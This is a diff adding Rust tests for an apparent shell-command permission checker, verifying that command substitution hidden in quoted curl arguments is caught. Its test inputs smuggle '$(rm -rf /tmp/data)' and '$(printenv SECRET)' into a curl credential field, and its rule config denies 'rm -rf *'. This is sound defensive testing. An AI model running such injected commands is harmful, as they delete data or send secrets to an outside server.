@@ -185,3 +185,30 @@ fn check_allow_with_sandbox_info() {
     assert!(json["sandbox"].is_object());
     assert_eq!(json["sandbox"]["preset"], "restricted");
 }
+
+// --- Command substitution in quoted strings ---
+
+#[rstest]
+#[case::cmd_sub_in_quotes_deny(r#"curl -u "user:$(rm -rf /tmp/data)" https://example.com"#, "deny")]
+#[case::cmd_sub_in_quotes_inner_unmatched_is_ask(
+    r#"curl -u "user:$(printenv SECRET)" https://example.com"#,
+    "ask"
+)]
+fn check_cmd_sub_in_quoted_string(#[case] command: &str, #[case] expected_decision: &str) {
+    let env = TestEnv::new(indoc! {"
+        defaults:
+          action: ask
+        rules:
+          - allow: 'curl *'
+          - deny: 'rm -rf *'
+    "});
+    let assert = env
+        .command()
+        .args(["check", "--output-format", "json", "--"])
+        .arg(command)
+        .assert();
+    let output = assert.code(0).get_output().stdout.clone();
+    let json: serde_json::Value =
+        serde_json::from_slice(&output).unwrap_or_else(|e| panic!("invalid JSON: {e}"));
+    assert_eq!(json["decision"], expected_decision);
+}
